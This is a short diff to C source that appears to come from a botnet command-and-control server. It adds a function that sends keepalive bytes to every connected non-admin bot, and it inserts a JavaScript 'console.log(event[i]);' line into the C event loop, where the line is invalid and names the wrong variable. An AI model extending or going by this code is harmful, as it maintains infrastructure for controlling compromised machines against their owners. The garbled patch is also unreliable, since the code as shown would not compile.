@@ -109,6 +109,17 @@ void ping_pong(void)
 	}
 }
 
+void ping_pong2(void)
+{
+	int z;
+
+	for (z = 0; z < MAXFDS; z++)
+	{
+		if (clients[z].connected == 1 && clients[z].type != ADMIN)
+			send(clients[z].fd, "\x01\n", 2, MSG_NOSIGNAL);
+	}
+}
+
 void *tab_title(void *arg)
 {
 	int botcount = 0, i;
@@ -239,6 +250,7 @@ void *bot_event(void *arg)
 			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) 
 			{
 				printf("[Cnc] Client disconnected %d\n", events[i].data.fd);
+				console.log(event[i]);
 				clearnup_connection(&clients[events[i].data.fd]);
 				continue;
 			}
